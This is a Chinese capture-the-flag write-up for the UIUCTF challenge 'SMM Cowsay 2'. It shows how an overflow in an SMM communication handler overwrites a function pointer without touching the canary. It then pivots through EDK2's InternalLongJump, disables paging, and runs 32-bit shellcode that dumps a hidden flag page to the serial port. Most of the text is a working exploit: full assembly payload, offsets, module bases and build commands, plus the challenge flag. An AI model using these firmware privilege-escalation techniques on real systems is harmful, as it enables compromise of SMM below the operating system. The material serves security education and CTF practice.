# SMM Cowsay 2

## 题目简述

第二题修复了直接指针解引用，并把 flag 所在页 `0x44440000` 标成 `EFI_MEMORY_RP`。在 SMM 的恒等映射页表中，这会清除对应 PTE 的 Present 位；直接读取将触发页故障并进入死循环。

新的 handler 先把通信数据复制到 SMRAM 中的调试结构，再调用结构中的函数指针：

```c
struct {
  CHAR16 Message[200];
  VOID EFIAPI (* volatile CowsayFunc)(
      IN CONST CHAR16 *Message,
      IN UINTN MessageLen);
  BOOLEAN volatile Icebp;
  UINT64 volatile Canary;
} mDebugData;

TempCommBufferSize = *CommBufferSize;
mDebugData.Canary = Canary;
SmmCopyMemToSmram(mDebugData.Message,
                  CommBuffer,
                  TempCommBufferSize);

if (mDebugData.Canary != Canary)
  triple_fault();

SetMem(mDebugData.Message, sizeof(mDebugData.Message), 0);
mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);
```

复制长度完全取自攻击者可控的 `MessageLength`，而目的数组只有 $200\times2=400$ 字节。复制超过 400 字节即可覆写 `CowsayFunc`；只要在对齐后的 Canary 之前停止，随机 Canary 就不会变化。

## 解题过程

### 精确覆盖函数指针而不碰 Canary

结构中的关键偏移为：

```text
+0x000  Message[400]
+0x190  CowsayFunc[8]
+0x198  Icebp[1]
+0x1a0  Canary[8]
```

发送 409 字节：前 400 字节作为伪造上下文，接着 8 字节覆盖 `CowsayFunc`，最后 1 字节把 `Icebp` 保持为 0。`Canary` 位于偏移 416，未被写到，因此检查通过。

覆写目标选用 EDK2 `InternalLongJump` 中的 `CetDone`。函数指针按 Microsoft x64 ABI 调用时，`RCX` 正好指向攻击者的 `CommBuffer`；而 `CetDone` 会依次从 `RCX` 指向的数据恢复 `RBX`、`RSP`、`RBP`、`RDI`、`RSI`、`R12` 至 `R15`，最后跳到 `[RCX+0x48]`。这相当于一个现成的完整寄存器与栈迁移 gadget。

本构建的符号和加载日志给出：

```text
PiSmmIpl base             = 0x06ac7000
mSmmCorePrivateData       = PiSmmIpl + 0x7140
PiSmmCpuDxeSmm base       = 0x07fbf000
CetDone                   = PiSmmCpuDxeSmm + 0x10580
Base                      = PiSmmCpuDxeSmm + 0x0ff1a
```

### 关闭分页并切换到 32 位载荷

flag 页只是被页表隐藏，物理数据仍在。官方解法不修改 PTE，而是直接清除 `CR0.PG`。伪造 LongJump 上下文时：

```text
RBX = 0x80010033 & ~0x80000000 = 0x00010033
RSP = 受控 ropchain
RIP = Base + 25
```

`Base+25` 落在 SMM 入口模板的 `mov cr0, rbx; retf` 附近。执行后分页关闭，`retf` 再从受控栈取得 32 位 `EIP` 和代码段选择子 `CS=0x8`，切回已有的 32 位保护模式代码段。此时普通世界分配的 shellcode 缓冲区以物理地址直接可执行，载荷从 `0x44440000` 逐字节读取并写到串口 I/O 端口 `0x3f8`：

```asm
.code32
smm_payload:
  mov $0x44440000,%esi
  mov $0x3f8,%dx
smm_payload_loop:
  lodsb
  outb %al,(%dx)
  jmp smm_payload_loop
```

### 官方 payload 的关键布局

下面保留了决定利用是否成功的完整通信数据布局。前面的普通 UEFI shellcode只需像第一题一样用 `RBX->BootServices->AllocatePool` 分配缓冲区、复制 `buffer`，把地址写入 `mSmmCorePrivateData`，再向 `0xB3`、`0xB2` 发出 SMI：

```asm
PiSmmCpuDxeSmm_base = 0x00007FBF000
CetDone = 0x10580
Base = 0x0ff1a

  mov $PiSmmCpuDxeSmm_base,%r14

  lea ropchain(%rip),%rax
  mov %rax,fill_ropchain(%rip)
  lea buffer_end(%rip),%rax
  mov %rax,fill_buffer_end(%rip)
  lea Base(%r14),%rax
  lea 25(%rax),%rax
  mov %rax,fill_base(%rip)
  lea CetDone(%r14),%rax
  mov %rax,fill_cetdone(%rip)
  lea smm_payload(%rip),%rax
  mov %eax,fill_smm_payload(%rip)

  # 分配并复制 buffer 后：
  mov buffer_send(%rip),%rax
  movq %rax,56(%r13)       # CommunicationBuffer
  movq $(buffer_end-buffer),64(%r13)  # BufferSize
  xor %eax,%eax
  outb %al,$0xB3
  outb %al,$0xB2
  jmp .

.code32
smm_payload:
  mov $0x44440000,%esi
  mov $0x3f8,%dx
1:
  lodsb
  outb %al,(%dx)
  jmp 1b

buffer_send:
  .quad 0

buffer:
  .long 0x9a75cf12
  .short 0x2c83
  .short 0x4d10
  .byte 0xb5,0xa8,0x35,0x75,0x54,0x65,0x92,0xf7
  .quad buffer_end - message

message:
  .quad 0x0000000080010033 & ~0x80000000  # RBX -> CR0
fill_ropchain:
  .quad -1                  # RSP
  .quad 0                   # RBP
fill_buffer_end:
  .quad -1                  # RDI
  .quad 0x44440000          # RSI
  .quad 0                   # R12
  .quad 0                   # R13
  .quad 0                   # R14
  .quad 0                   # R15
fill_base:
  .quad -1                  # RIP -> mov cr0,rbx; retf

ropchain:
fill_smm_payload:
  .long -1                  # 32-bit EIP
  .long 0x8                 # 32-bit protected-mode CS

  .rept 400 - (. - message)
  .byte 0
  .endr

fill_cetdone:
  .quad -1                  # 覆写 CowsayFunc
  .byte 0x00                # Icebp = 0，Canary 未覆盖
buffer_end:
```

官方构建方式仍是提取 `.text` 并发送十六进制：

```bash
gcc -static -nostartfiles solution.S -o solution.o
objcopy -j .text -O binary solution.o solution.bin
xxd -p solution.bin > solution.txt
```

载荷会持续把 flag 后续内存输出到串口，客户端读取到右花括号即可停止。仓库元数据记录的 flag 为：

```text
uiuctf{dont_try_this_at_home_I_mean_at_work_5dfbf3eb}
```

## 方法总结

- 核心技巧：用受控长度越界精准覆写 SMRAM 中的函数指针，避开位于更后方的 Canary；借 `InternalLongJump` 迁移全部关键寄存器和栈，再关闭分页读取被标为 non-present 的物理页。
- 识别信号：固定大小消息数组后紧跟函数指针，复制长度来自通信头；保护补丁只改页表权限，并未移除物理数据。
- 复用要点：Canary 只能检测覆盖到它自身的写入，无法保护排在它前面的控制字段；模式切换、`CR0` 位和远返回栈布局都依赖具体架构。所有模块基址与符号偏移必须从随题日志和调试符号核对。
